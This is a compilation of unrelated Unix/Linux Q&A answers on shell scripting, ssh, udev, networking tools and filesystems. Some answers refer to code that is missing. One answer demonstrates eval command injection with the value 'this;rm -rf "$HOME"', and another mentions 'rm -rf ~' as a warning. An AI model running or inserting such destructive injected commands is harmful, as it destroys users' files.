the correct way of referencing a variable is $VAR . since your VAR is populated by wc , i am assuming that it is always non-empty , so you do not actually need the quotes "" - those are only for guarding against the case that a variable might be totally empty . however , that is not your problem here . the -gt operator not only requires two arguments , but they must be integers . what you are passing to -gt here is , e.g. 50 in the one case and {50} in the other . the latter is not an integer expression , it is a string starting with { , so you should leave the braces off . braces are a permissible alternative syntax for using variables : $VAR is the same as ${VAR} . this is sometimes useful when you interpolate a variable in a way that it is unclear where the variable name ends . for instance , if you want to print your variable value and an index , sometimes it is necessary to write something like echo ${VAR}00  to get output like Hugo00 . without the braces , bash would try to dereference the variable VAR00 and fail , since there is no such variable . ( note that in this case there is a dollar sign in front of the braces . ) but since you are not interpolating anything , but using the variable exactly as it is , you do not need to bother with braces .
in zsh , using zmv : autoload zmv; alias zcp='zmv -C' # this can go into your .zshrc zcp '/home/(*)/.bash_history' '~/user-bash/$1.txt'  in other shells : for x in /home/*/.bash_history; do u=${x%/*}; u=${u##*/} cp "$x" ~/user-bash/"$u.txt" done 
if [ a == b ] &amp;&amp; [ a == c ]; then // passed conditions fi  nesting them with bash specific syntax is not so bad : if [[ ( a == b &amp;&amp; a == c) || b == c ]]; then  but i believe it gets extremely ugly if you want to be sh compatible .
global paths should be set in /etc/profile or /etc/environment , just add this line to /etc/profile: PATH=$PATH:/path/to/ANT/bin 
first , read sending text input to a detached screen . you do need -p to direct the input to the right window . also , the command will not be executed until you stuff a newline ( cr or lf , the interactive shell running inside screen accepts both ) . that is : screen -p 0 -X stuff "script -a -c 'ls -l' /tmp/command.log$(printf \\r)" &amp;&amp; cat /tmp/command.log  there is a second problem , which is that the screen -X stuff \u2026 command completes as soon as the input has been fed into the screen session . but it takes a little time to run that script command . when cat /tmp/command.log executes , it is likely that script has not finished ; it might not even have started yet . you will need to make the command running inside screen produce some kind of notification . for example , it could signal back that it is finished , assuming that the shell within screen is running on the same machine as screen . sh -c ' sleep 99999999 &amp; screen -p 0 -X stuff "\ script -a -c \"ls -l\" /tmp/command.log; kill -USR1 $! " wait cat /tmp/command.log ' 
check udev config files . a file like this : /etc/udev/rules . d/70-persistent-net . rules ties the name ( ethx ) to the mac address . you probably have the old cards mac tied to eth0 . remove its line and change the new card to eth0 .
the read system call reads some bytes from an open file . the “odd string” is the bytes that are read by the call . this call attempts to read 32 bytes ( third parameter ) , and succeeds ( return value ) , from file descriptor 34 . to find out what file your application is reading for , look back in the trace for the system call that opens this file descriptor . this could be open ( return value ) , pipe ( first argument ) , socket ( return value ) or a few others . the file descriptor may also have been returned by dup or dup2 or dup3 , in which case you would need to trace back the file descriptor that was duplicated . you can also run lsof -p 25302 to see what files that process has open at the time you run the lsof command , if the process is still running .
afaik they provide their own opengl implementation with drivers , so you should already have it installed . you should've had another open source implementation before installing drivers though , likely mesa . tip : i have never had to install opengl explicitly in my life .
background when you are attempting to use nc in this manner it is continuing to keep the tcp port open , waiting for the destination to acknowledge the receiving of the done request . this is highlighted in the tcp article on wikipedia . time-wait ( either server or client ) represents waiting for enough time to pass to be sure the remote tcp received the acknowledgment of its connection termination request . [ according to rfc 793 a connection can stay in time-wait for a maximum of four minutes known as a msl ( maximum segment lifetime ) . ] you can see the effects of this when i use nc similarly : $ nc -p 8140 -v -n 192.168.1.105 80  looking at the state of port 8140: $ netstat -anpt | grep 8140 tcp 0 0 192.168.1.3:8140 192.168.1.105:80 TIME_WAIT -  in fact on most linux systems this TIME_WAIT is set to 60 seconds . $ cat /proc/sys/net/ipv4/tcp_fin_timeout 60  if you want to see the effect yourself you can use this snippet to watch when the port becomes released . method #1 - using nc the releasing of the port 8140 takes some time to occur . you will either need to wait until it is been fully released ( putting some sleeps in between would be 1 easy way ) or by using a different port . if you just want to see if the port @ host is open or not you could just drop the -p 8140 . $ nc -zv -n 10.X.X.9 9090-9093  example note : you might be tempted to try adding the -w option to nc , which instructs it to only wait a certain period of time . by default nc will wait forever . so your command would be something like this : $ nc -p 8140 -zv -n 10.X.X.9 9090 -w 1  however in my testing on a centos 5.9 system using 1.84 it still continued to keep the port in use afterwards , so the best you had be able to do is use -w 60 since that is the shortest amount of time until TIME_WAIT takes effect . method #2 - using nmap if you want to use a more appropriate app for scanning a set of ports then i would suggest using nmap instead . $ sudo nmap -sS --source-port 8140 -p 9090-9093 10.X.X.9  example here i have setup a filter using iptraf to prove the traffic is going out to these ports using the source port of 8140 . note : pay special attention to #1 in the diagram , that shows the source port 8140 , while #2 shows a couple of my destination ports that i selected , mainly 80 and 83 . &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; references nmap cheat sheet bind : address already in use - or how to avoid this error when closing tcp connections
wine works even for windows cli apps .
you need to include -DWITHOUT_X11 as make argument . depending on how you install ports you can ' include ' it ( sorry - i cannot find the details right now ) . alternatively there is a ports-mgmt/portconf package in which you can specify without_x11 , if i understand correctly , in such manner : *: WITHOUT_X11  please note that it will work only with optional x11 dependencies - installing kde will still install x11 .
you will want to look into symbolic links i believe .
a redirection &lt;"dir/file" opens the file for reading on standard input for the duration of the command that the redirection applies to . when there is no command , the file is open for reading ( which leads to an error if the file does not exist or lacks proper permission ) , but other than that the redirection has no effect . ksh added an extension , which has been adopted by bash and ksh . if a command substitution contains an input redirection and nothing else $(&lt;"dir/file") ( no command , no other redirection , no assignment , etc . ) , then the command susbtitution is replaced by the content of the file . thus $(&lt;"dir/file") is equivalent to $(cat "dir/file") ( except that it does not call the cat utility , so it is marginally faster and does the same thing even if cat has been replaced or is not in the command search path ) . this is mentioned in the bash manual under “command substitution” .
from this super user answer , the do you want to continue ? prompt appears when : extra packages ( besides those you asked to install - e.g. dependencies ) will be installed essential packages are to be removed . essential here is defined as the minimal set of functionality that must be available and usable on the system at all times , even when packages are in an unconfigured ( but unpacked ) state . packages are tagged essential for a system using the essential control field . changing a held package if you want apt-get to automatically say yes ( not a very good idea unless you have a very specific reason ) , you can use --yes --force-yes parameter .
by issuing the command complete you will get the list of all completion definitions . then you can search the offending definition somewhere in /etc/bash_completion and /etc/bash_completion.d . there can be also some .bash_completion in your home directory . on my system the $HOME variable is completed properly , but then fails to complete anything . did you try to use ~ instead of $HOME ? it is easier to type and it works as expected . . .
at this time , you cannot . it is core functionality in the current gnome shell .
remember to arch-chroot and not simply chroot - that way /proc will be populated and pacman will function as expected .
if it is not an interactive or a login shell i think you are left with using ~/.zshenv . the following is from section " startup/shutdown files " in zshall(1):
thanks for all the answers , but finally i found a solution using vim -> http://filip.rembialkowski.net/vim-as-a-pager-for-psql/ . comments welcome !
ok , it is been a long time , but i will still answer my question with the best option i found as of now . the best way is to create a udev rule , associated with some scripts ( that will create / remove directories and mount / unmount removable devices ) , and attached to partition udev device event type . 1 - creating add / remove scripts add this script storage-automount.sh in /lib/udev/ and set it to executable ( sudo chmod +r /lib/udev/storage-automount.sh ) : add this script storage-autounmount.sh in /lib/udev/ and set it to executable ( sudo chmod +r /lib/udev/storage-autounmount.sh ) : 2 - creating the udev rule to attach those scripts to events and finally , add a udev rule in etc/udev/rules.d , for instance 85-storage-automount.rules: ENV{DEVTYPE}=="partition", RUN+="/lib/udev/storage-automount.sh", ENV{REMOVE_CMD}="/lib/udev/storage-autounmount.sh"  and that is it . now , when you plug a storage device in , a directory will be created in /media/ according to the partition name ( i do not remember but i think it is working with ntfs partition as well ) and your partition will be mounted into it . it is r/w for users if you have a plugdev group on your system . also , the devices are mounted in synchronous mode in order to limit the risks of data loss in case of hot unplugging . when the device is removed , it is unmounted and the directory is removed from /media also , the tool to monitor the udev events is udevadm monitor , with options like --env or --property: $ udevadm monitor --env  this is tested and working fine on both debian and arch , but probably work on all distributions that rely on udev .
that is a bug in bash-4.2 up to patch 29 in utf-8 locales related to globbing with strings containing invalid utf-8 characters ( which \365\\ is ) . you can also reproduce it with : : *$'\365x'  that was fixed in patch 30 , see the patch description and mailing list discussion for details .
instead of encrypting a whole volume , which is the truecrypt , luks and loopback approach , you can also encrypt the individual files you store in the cloud . doing that manually with pgp before copying the file to your cloud synchronized directory is one way , but a bit cumbersome . encfs may be a solution for you instead . it transparently encrypts files , using an arbitrary directory as storage for the encrypted files . two directories are involved in mounting an encfs filesystem : the source directory , and the mountpoint . each file in the mountpoint has a specific file in the source directory that corresponds to it . the file in the mountpoint provides the unencrypted view of the one in the source directory . filenames are encrypted in the source directory .
the unity game engine and the unity user interface are two different projects with the same name . you can explore the projects of the unity user interface here : unity project website
i would try viewing it in gimp . should be in your distros ' repositories , main website 's here . lots of tutorial are available through a simple google search . when i tried to open your image size i needed to up gimp 's default paging limit so that it could accommodate it . it is under the menu edit -> preferences : &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; if gimp can not handle the image or you want something lighter then you might want to try feh . feh 's main web site is here . again should be in repositories . you can run it from the terminal like this : feh -F &lt;image&gt;  this will size it to fit the screen .
none . see also : https://wiki.archlinux.org/index.php/arch_based_distributions_%28active%29
the solution is to modify ~/.tmux.conf to : # Start windows and panes at 1, not 0 set -g base-index 1 set -g pane-base-index 1 
the cat command outputs contents of the file .ssh/id_rsa.pub ; the | ( pipe ) receives this text output and then sends ( i.e. . pipes ) the text to ssh . then , ssh uses this text as input for the cat &gt;&gt; .ssh/authorized_keys command .
you can create a directory for the group where you want the shared files to live . then , you can set setgid bit on the directory , which forces all newly created files to inherit the group from the parent directory . this way you do not need to chgrp the files . so , for example : mkdir /shared chgrp sharegroup /shared chmod g+swr /shared  now , if any user creates a files in /shared , its owner will be that user and group will be sharegroup . you also need to make sure that the default umask for users is 0664 , which means group members can write to files too .
if the hdd is having to re-read either a bad block or bad sector , which is beginning to fail , it will try to re-read a given section several times until it is able to do so . this behavior will manifest as the hdd " slowing down " but it is the act of having to read a given area from the disk a multitude of times that you are experiencing . typically when this occurs i will run the hdd through either hdat2 or spinrite to determine if there are any bad blocks on the disk and instruct either of these 2 tools to attempt to repair and/or recover the data from defective blocks . this is only a short-term fix , typically if it continues to happen then it is often times a symptom of a larger problem looming that the hdd is going to fail in the not to distant future . if this is the case then i would begin planning on getting a replacement and migrating the data from the problem drive before it actually fails .
with bash ( also zsh and ksh ) , you can do like this : while read line do [[ ! $line == *:* ]] &amp;&amp; continue echo $line done  or using older test [ with other POSIX shell : [ ! -z "${line##*:*}" ] &amp;&amp; continue 
how devices are " set up " , in general , has nothing to do with /sys . most likely you are looking for information about udev or another hotplugging daemon . you can find authoritative information about /sys ( for which , the underlying filesystem is called sysfs ) in the kernel documentation .
to answer literally , to close all open file descriptors for bash: for fd in $(ls /proc/$$/fd); do eval "exec $fd&gt;&amp;-" done  however this really is not a good idea since it will close the basic file descriptors the shell needs for input and output . if you do this , none of the programs you run will have their output displayed on the terminal ( unless they write to the tty device directly ) . if fact in my tests closing stdin ( exec 0&gt;&amp;- ) just causes an interactive shell to exit . what you may actually be looking to do is rather to close all file descriptors that are not part of the shell 's basic operation . these are 0 for stdin , 1 for stdout and 2 for stderr . on top this some shells also seem to have other file descriptors open by default . in bash you have 255 ( also for terminal i/o ) and dash i have 10 which points to /dev/tty rather than the specific tty/pts device the terminal is using . to close everything apart from 0 , 1 , 2 and 255 in bash: for fd in $(ls /proc/$$/fd); do case "$fd" in 0|1|2|255) ;; *) eval "exec $fd&gt;&amp;-" ;; esac done  note also that eval is required when redirecting the file descriptor contained in a variable , if not bash will expand the variable but consider it part of the command ( in this case it would try to exec the command 0 or 1 or whichever file descriptor you are trying to close ) . also using a glob instead of ls ( eg /proc/$$/fd/* ) seems to open an extra file descriptor for the glob , so ls seems the best solution here . update for further information on the portability of /proc/$$/fd , please see portability of file descriptor links . if /proc/$$/fd is unavailable , then a drop in replacement for the $(ls /proc/$$/fd) , using lsof ( if that is available ) would be $(lsof -p $$ -Ff | grep f[0-9] | cut -c 2-) .
its probably related to this change in 3.2: syslog-ng traditionally expected an optional hostname field even when a syslog message is received on a local transport ( e . g . /dev/log ) . however no unix version is known to include this field . this caused problems when the application creating the log message has a space in its program name field . this behaviour has been changed for the unix-stream/unix-dgram/pipe drivers if the config version is 3.2 and can be restored by using an explicit ' expect-hostname ' flag for the specific source . you receive the warning because you use the unix-stream ( "/dev/log" ) ; in your source . if you do not experience any problems with your local logs , there is nothing else to do except changing the first line to @version : 3.2 if your distro adds the hostname to log messages coming from /dev/log ( which they rarely do ) , then include flags ( expect-hostname ) in the source . regards , robert fekete syslog-ng documentation maintainer
you are looking for ncurses .
as always , beware of grep -r . -r is not a standard option , and in some implementations like all but very recent versions of gnu grep , it follows symbolic links when descending the directory tree , which is generally not what you want and can have severe implications if for instance there is a symlink to "/" somewhere in the directory tree . in the unix philosophy , you use a command to search directories for files , and another one to look at its content . using gnu tools , i would do : xargs -r0 --arg-file &lt;(find . -type f -exec grep -lZi string {} + ) mv -i --target-directory /dest/dir  but even then , beware of race conditions and possible security issues if you run it as one user on a directory writeable by some other user .
ok , i have found a way , though it does not look very clean ; ) i will start from the end - running this one-liner will tell you the truth : nice , is not it ? and here is , how it works : the beginning should be obvious : grep "USB.*" /proc/acpi/wakeup extracts from the list only usb devices that have a known sysfs node . cut -d ':' -f 2- leaves just the ending ( numbers ) after ' pci:' on each line . then , for each ending ( aaa=0000:00:1d.2 and so on ) , try to find an udev device symlink that contains the string . for each device symlink found , the find command : prints the name of udev symlink , &lt ; -- this is the most useful part executes grep to display the line from /proc/acpi/wakeup that corresponds to the found device , appends a blank line for output clarity . so , thanks to the meaningful naming of device symlinks by udev , you can tell which usb device is the keyboard , mouse etc .
a simple example : suppose you want to delete and purge messages from the testmbox mailbox , containing [ delete-me ] in the subject line . you can do this : mutt -f testmbox -e "push &lt;tag-pattern&gt;~s[DELETE-ME]\\n&lt;tag-prefix&gt;&lt;delete-message&gt;&lt;sync-mailbox&gt;\\n" this works because : -e executes configuration commands ' push ' is a configuration command that add key sequences to the keyboard buffer , i.e. to mutt , looks just like entering T~s[DELETE-ME]&lt;ENTER&gt;;d$&lt;ENTER&gt; interactively ( assuming a default keyboard layout ) . tested with mutt 1.5.21
instead of doing a regex match on the second column , you probably just want to a string comparison . to do this with the example you have given , you have to include the single quotes in the comparison which turns the whole thing into a bit of a shell quoting nightmare . doing that gives the following :
yes , all matching blocks are applied . if you say ssh -v sop it will show you exactly which lines of the config are applied in this case .
foo &amp; bg_pid=$! kill "$bg_pid"  you can also use the shell 's internal kill command with ( at least in case of bash ) the job number : foo &amp; kill %1  but that is probably not easier . may be easier interactively . but with kill %+  or kill %  you always get the last one . you can even identify the job to be killed by parts of the command line . see man bash ; search for the block JOB CONTROL .
the same written for zsh in a much cleaner way :
the most obvious way to run a command remotely is to specify it on the ssh command line . the ssh command is always interpreted by the remote user 's shell . ssh bob@example.com '. ~/.profile; command_that_needs_environment_variables' ssh -t bob@example.com '. ~/.profile; exec zsh'  shared accounts are generally a bad idea ; if at all possible , get separate accounts for every user . if you are stuck with a shared account , you can make an alias : ssh -t shared-account@example.com 'HOME=~/bob; . ~/.profile; exec zsh'  if you use public key authentication ( again , recommended ) , you can define per-key commands in ~/.ssh/authorized_keys . see this answer for more explanations . edit the line for your key in ~/.ssh/authorized_keys on the server ( all on one line ) :
first , “ancestor” is not the same thing as “parent” . the ancestor can be the parent 's parent 's … parent 's parent , and the kernel only keeps track of one level . however , when a process dies , its children are adopted by init , so you will see a lot of processes whose parent is 1 on a typical system . modern linux systems additionally have a few processes that execute kernel code , but are managed as user processes , as far as scheduling is concerned . ( they do not obey the usual memory management rules since they are running kernel code . ) these processes are all spawned by kthreadd ( it is the init of kernel threads ) . you can recognize them by their parent process id ( 2 ) or , usually , by the fact that ps lists them with a name between square brackets or by the fact that /proc/2/exe ( normally a symbolic link to the process executable ) can not be read . processes 1 ( init ) and 2 ( kthreadd ) are created directly by the kernel at boot time , so they do not have a parent . the value 0 is used in their ppid field to indicate that . think of 0 as meaning “the kernel itself” here . linux also has some facilities for the kernel to start user processes whose location is indicated via a sysctl parameter in certain circumstances . for example , the kernel can trigger module loading events ( e . g . when new hardware is discovered , or when some network protocols are first used ) by calling the program in the kernel.modprobe sysctl value . when a program dumps core , the kernel calls the program indicated by kernel.core_pattern if any .
someone else working on the same server remotely made some adjusted to the httpd . conf files while he was on vacation without notifying me . in var/etc/conf . d all the . conf files had their documentroot set to the drupal6 folder , instead of the wordpress folder .
in addition to all the references to :1 , :2 , etc ; you can also specify a network name or ip address before the colon , e.g. 192.168.0.1:0 - this will connect to a machine over the network . most modern x servers have authentication ( "mit-magic-cookie" ) , you will have to sort that out before you connect - see xhost and xauth . also , if you use ssh -X &lt;remotehost&gt; , then any x commands you run in that ssh session will connect to a different port ( a quick test on my box shows :10 ) , which is then pushed through your ssh connection back to the box you are coming from , and will show up on your screen there .
the script , data file and output that you posted are inconsistent . neither the script not the data file contain mv , yet your screenshot does . also , your screenshot mentions a line 28 , which the script you posted does not have . it is difficult to pinpoint your problem when you give us inconsistent information . that said , you are trying to do one of two things , neither of which can work the way you are trying . if the input file contains lines like mv "02 - Beautiful Emptiness.mp3" 1.mp3  then it is really a shell script . instead of reading it line by line , execute it as a shell script . make sure that you can trust this file , since you will be executing whatever is in there , including rm -rf ~ or some such . . inp2.sh  if the input file contains lines like "02 - Beautiful Emptiness.mp3"  then the way you are reading it does not work . read LINE does the following : read one line ; if that line ends with a backslash , remove the backslash and read another line ( repeat until a line that does not end with a \ has been read ) ; replace all backslash+character sequences by the second character only ; set LINE to the concatenation of the lines read , minus the newlines . when the shell executes the command $LINE , it does what it always does when it sees a variable substitution outside quotes , which is : split the value of the variable into a list of words at every place where it contains whitespace ( assuming the default value of IFS ) ; treat each word as a glob pattern , and expand it if it matches at least one file . sounds useless ? it is . and note that there is nothing about quotes in here : quotes are part of the shell syntax , they are not part of the shell expansion rules . what you probably should to is have inp2.txt contain a list of file names , one per line . see why is `while ifs= read` used so often , instead of `ifs= ; while read . . ` ? for how to read a list of lines from a file . you will be wanting something like just for completeness , i will mention another possibility , but i do not recommend it because it is fiddly and it will not let you do what you seem to be doing . a file like "02 - Beautiful Emptiness.mp3" "02 - Come. mp3" foo\ bar.mp3  then it can be read by the xargs command . the input to xargs is a whitespace-delimited list of elements , which can be either a literal ( possibly containing whitespace ) surrounded by single quotes , a literal ( possibly containing whitespace ) surrounded by double quotes , or an unquoted literal which may contain backslash escapes ( \ quotes the next character ) . note that the xargs syntax is unlike anything the shell might recognize .
user@host is how ssh defines who it attempts to authenticate as ( user ) and where it should do that ( host ) the user this can be any local user account on the desktop and/or laptop you are connecting to . this user will need to be able to login to that machine via ssh and have full permissions to all the directories you are trying to sync . you can view the current users available on your box in or the gui or cat /etc/passwd in a terminal . you may want to add a user to fedora specifically for your unison . maybe sync ? . you will probably want to set up ssh key 's between the two boxes . the host the host is the ip address or hostname component of the connection . in your case this will be the public ip of your desktop or laptop . most likely your desktop as that will probably be more stable than your laptop ip which will roam around depending on where you are connected . to find the current public ip of your laptop or desktop : curl -s http://wtfismyip.com/text  this ip address will probably change over time , depending on your isp , which can be a bit of a pain . you can get a dynamic dns name from someone like noip to get around this . the ssh connection would become something like sync@whatver.no-ip.org and the dns name whatver.no-ip.org will resolve to whatever machine is running the noip client . you will most likely have a nat router at home for your internet connection that you will need to port forward ssh through ( tcp port 22 ) for all this to work . note by the way , unless you really want to figure this out , it might be easier using one of the standard file hosts like dropbox who provide a linux client or google drive via insync or gdfuse . they do all the hosting then , you just run the client that sits in the background and syncs .
i tried this out and it seems to work as expected : echo "1.2.3.4 facebook.com" &gt;&gt; /etc/hosts then i ran : $ getent ahosts facebook.com 1.2.3.4 STREAM facebook.com 1.2.3.4 DGRAM 1.2.3.4 RA  i hope this helps you !
i believe you will need to run your dropbear ssh server inside a chroot'd jail if you want to restrict it to certain directories . if you were using a recent openssh , i would suggest using the chrootdirectory setting in your sshd_config . it does not appear as though dropbear has a similar parameter , so you will have to do it manually .
sounds like you are looking for fetchmail in conjunction with procmail . between the two of them , you should be able to solve all your automated mail-reading needs .
gnu coreutils since version 7.0 has a timeout command : timeout 10 tail -f /var/log/whatever.log  if you really need a pipe to timeout for some slightly different procedure , then pipe into timeout: tail -f /var/log/whatever.log | timeout 10 cat &gt; ./10_second_sample_of_log  note though that killing some arbitrary part of a pipeline may cause problems due to buffering , depending on signals and program behaviour ( this question covers related issues : turn off buffering in pipe ) . it will usually change the exit code of the process too . if you do not have ( a recent ) coreutils , this simple timeout program also works well http://www.unixlabplus.com/unix-prog/timeout/timeout.html or the perl approach : tail -f /var/log/whatever.log | perl -n -e 'BEGIN{alarm 10; $|=1}; print;'  ( note the $|=1 turns off output buffering , this is to prevent loss of output in the pipeline , as referred to above . ) the ( slightly ancient ) netpipes package also has a timelimit command ( which you can still find on some linux systems ) . this similar question has a few more options : how to introduce timeout for shell scripting ?
something like this :
you can use disown , it is a bash builtin : disown [ -ar ] [ -h ] [ jobspec . . . ] without options , each jobspec is removed from the table of active jobs . if the -h option is given , each jobspec is not removed from the table , but is marked so that sighup is not sent to the job if the shell receives a sighup . if no jobspec is present , and neither the -a nor the -r option is supplied , the current job is used . if no jobspec is supplied , the -a option means to remove or mark all jobs ; the -r option without a jobspec argument restricts operation to running jobs . the return value is 0 unless a jobspec does not specify a valid job . try this : $ &lt;your command&gt; &amp; $ disown  first , make your command run in background by typing &lt;your command&gt; &amp; , then use disown , it will make your command keep running even if your ssh session is disconnected . imho , you should use a tool to control your service , like supervisord or writing your own init script .
it is not specified in the question if you want this executed on the local or remote machine . it is also not specified which shell is present on either machine , so i am assuming bash for both . if you want to execute it on the remote machine , look at ~/.bash_logout , which is executed when a login shell logs out gracefully . from man bash: when a login shell exits , bash reads and executes commands from the file ~/.bash_logout , if it exists . you can do a test in ~/.bash_logout to check if the shell being logged out of is an ssh session , something like the following should work : if [[ $SSH_CLIENT || $SSH_CONNECTION || $SSH_TTY ]]; then # commands go here fi  if you want to execute it on the local machine , create a function wrapper around ssh . something like the following should work : ssh() { if command ssh "$@"; then # commands go here fi }  that may be too simple for your needs , but you get the idea .
if your system is not reporting a device wlan0 as available then the linux kernel was unsuccessful in detecting your hardware and associating a driver to it . i would start by looking in the dmesg output for any messaging related to the broadcom device . if it is being reported there in any way then the appropriate driver is either not present within the kernel/system or it is misconfigured for your particular system . finding a driver searching a bit on the name of your card + linux yielded this thread titled : thread : broadcom bcm43142 driver ubuntu 12.10 64 bit which has details on how to install/configure an appropriate driver for your system .
there looks to be 2 ways you can do this . method #1: manually create . desktop file yes you need to create a custom . desktop launcher for it . here are the general steps : create * . desktop file in /usr/local/share/applications ( or /usr/share/applications depending upon your system ) . $ gksudo gedit &lt;insert-path-to-new-file.desktop&gt;  paste below text [Desktop Entry] Type=Application Terminal=false Name=IntelliJ IDEA Icon=/path/to/icon/icon.svg Exec=/path/to/file/idea.sh  edit Icon= and Exec= and Name= . also Terminal=True/false determines weather the terminal opens a window and displays output or runs in the background . put the . desktop file into the unity launcher panel . for this step you will need to navigate in a file browser to where the . desktop file is that you created in the previous steps . after locating the file , drag the file to the unity launcher bar on the side . after making doing this you may need to run the following command to get your system to recognize the newly added . desktop file . $ sudo update-desktop-database  method #2: gui method instead of manually creating the . desktop file you can summon a gui to help assist in doing this . install gnome-panel $ sudo apt-get install --no-install-recommends gnome-panel  launch the . desktop gui generator $ gnome-desktop-item-edit ~/Desktop/ --create-new  &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; references how to add a shell script to launcher as shortcut
there is a solaris roadmap in page 33 of this slideware from https://blogs.oracle.com/openomics/entry/solaris_day_27nov2013_slides have a look to page 2 disclaimer first .
lennart poettering recently did some digging into linux filesystem locking behaviour , which does not paint a particularly rosy picture for locking over nfs ( especially the follow-up he links to at the bottom of the post ) . http://0pointer.de/blog/projects/locking.html
here 's the answer to your question : s/^\(.\{15\}\)\(.\{2\}\)\(.\{2\}\)\(.\{4}\)/\1\4\3\2/  but if you can anchor to the end instead , it gets simpler : s/\(.\{2\}\)\(.\{2\}\)\(.\{4\}\)$/\3\2\1/  personally , i would probably do [0-9] instead of . as well : s/\([0-9]\{2\}\)\([0-9]\{2\}\)\([0-9]\{4\}\)$/\3\2\1/  as usual , there is more than one way to do it .
one way to go is to create a second disk image , add it to your guest os and copy files from one to the other . make the second disk bootable and remove the first one . another way is to resize your filesystem with resize2fs to its minimum size possible then resize the partition with parted resize to the same or a bit larger size create a new partition in the new unallocated space and zero it out with dd if=/dev/zero of=/dev/sdXY use VBoxManage modifyhd &lt;uuid&gt;|&lt;filename&gt; --compact to shrink the image . resize the partition and then the filesystem to their original size .
the purpose of watch is to show the results of a command full-screen and update continuously ; if you are redirecting the output into a file and backgrounding it there is really no reason to use watch in the first place . if you want to just run a command over and over again with a delay ( watch waits two seconds by default ) , you can use something like this : while true; do cmd &gt;&gt; output.txt sleep 2 done 
a hardware interrupt is not really part of cpu multitasking , but may drive it . hardware interrupts are issued by hardware devices like disk , network cards , keyboards , clocks , etc . each device or set of devices will have its own irq ( interrupt request ) line . based on the irq the cpu will dispatch the request to the appropriate hardware driver . ( hardware drivers are usually subroutines within the kernel rather than a separate process . ) the driver which handles the interrupt is run on the cpu . the cpu is interrupted from what is was doing to handle the interrupt , so nothing additional is required to get the cpu 's attention . in multi processor systems , an interrupt will usually only interrupt one of the cpus . ( as a special cases mainframes have hardware channels which can deal with multiple interrupts without support from the main cpu . ) the hardware interrupt interrupts the cpu directly . this will cause the relevant code in the kernel process to be triggered . for processes that take some time to process , the interrupt code may allow itself to be interrupted by other hardware interrupts . in the case of timer interrupt , the kernel scheduler code may suspend the process that was running and allow another process to run . it is the presence of the scheduler code which enables multitasking . software interrupts are processed much like hardware interrupts . however , they can only be generated by processes which are currently running . typically software interrupts are requests for i/o ( input or output ) . these will call kernel routines which will schedule the i/o to occur . for some devices the i/o will be done immediately , but disk i/o is usually queued and done at a later time . depending on the i/o being done , the process may be suspended until the i/o completes , causing the kernel scheduler to select another process to run . i/o may occur between processes and the processing is usually scheduled in the same manner as disk i/o . the software interrupt only talks to the kernel . it is the responsibility of the kernel to schedule any other processes which need to run . this could be another process at the end of a pipe . some kernels permit some parts of a device driver to exist in user space , and the kernel will schedule this process to run when needed . it is correct that a software interrupt does not directly interrupt the cpu . only code that is currently running code can generate a software interrupt . the interrupt is a request for the kernel to do something ( usually i/o ) for running process . a special software interrupt is a yield call , which requests the kernel scheduler to check to see if some other process can run . response to comment : for i/o requests , the kernel delegate the work to the appropriate kernel driver . the routine may queue the i/o for later processing ( common for disk i/o ) , or execute it immediately if possible . the queue is handled by the driver , often when responding to hardware interrupts . when one i/o completes , the next item in the queue is sent to the device . yes , software interrupts avoid the hardware signaling step . the process generating the software request must be currently running process , so they do not interrupt the cpu . however , they do interrupt the flow of the calling code . if hardware needs to get the cpu to do something , it causes the cpu to interrupt its attention to the code it is running . the cpu will push its current state on a stack so that it can later return to what it was doing . the interrupt could stop : a running program ; the kernel code handling another interrupt ; or the idle process .
using eval is wrong in the first place . the shell has already evaluated what you pass to FUNCexecEcho , evaluating a second time is wrong and potentially dangerous . in your code , you are also discarding the exit status of the command . FUNCexecEcho() { echo "EXEC: $@" "$@" }  ( no problem with aliases there unless you define an alias for "$@" ) . compare the behaviour in : FUNCexecEcho echo 'this;rm -rf "$HOME"'  with the two versions . with mine , it gives : $ FUNCexecEcho echo 'this;rm -rf "$HOME"' EXEC: echo this;rm -rf "$HOME" this;rm -rf "$HOME"  i suggest you do not run it with yours if you do not have backups ; - )
there is a very useful nautilus extension called nautilus-open-terminal that does just what you asked . you should find it in the standard repositories . once installed you should have a " open in terminal " entry in the file menu .
improving terdon 's answer , you do not even need to invoke those two processes ( hostname and cut ) . just use bash 's string manipulation : PS1="\[\033[01;32m\]\u@${HOSTNAME:0:10}\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$(parse_git_branch)\\n\$ " 
with gnu coreutils ( non-embedded linux , cygwin ) : cp -p --parents path/to/somefile /TARGETDIR  with the posix tool pax ( which many default installations of linux unfortunately lack ) : pax -rw -pp relative/path/to/somefile /TARGETDIR  with its traditional counterpart cpio : find relative/path/to/somefile | cpio -p -dm /TARGETDIR  ( this last command assumes that file names do not contain newlines ; if the file names may be chosen by an attacker , use some other method , or use find \u2026 -print0 | cpio -0 \u2026 if available . ) alternatively , you could make it a shell script or function . cp_relpath () { mkdir -p -- "$2/$(dirname -- "$1")" cp -Rp -- "$1" "$2/$(dirname -- "$1")" } 
a filename may not be empty . to quote the single unix specification , §3.170 , a filename is : a name consisting of 1 to {name_max} bytes used to name a file . the characters composing the name may be selected from the set of all character values excluding the &lt ; slash&gt ; character and the null byte . so , it must consist of at least 1 byte , i.e. , not empty . not that from that definition , none of those characters need to be visible ( i.e. . , could all be whitespace ) nor do they need to be printing ( could all be control characters ) . and if you are assuming file names are utf-8 , they need not be .
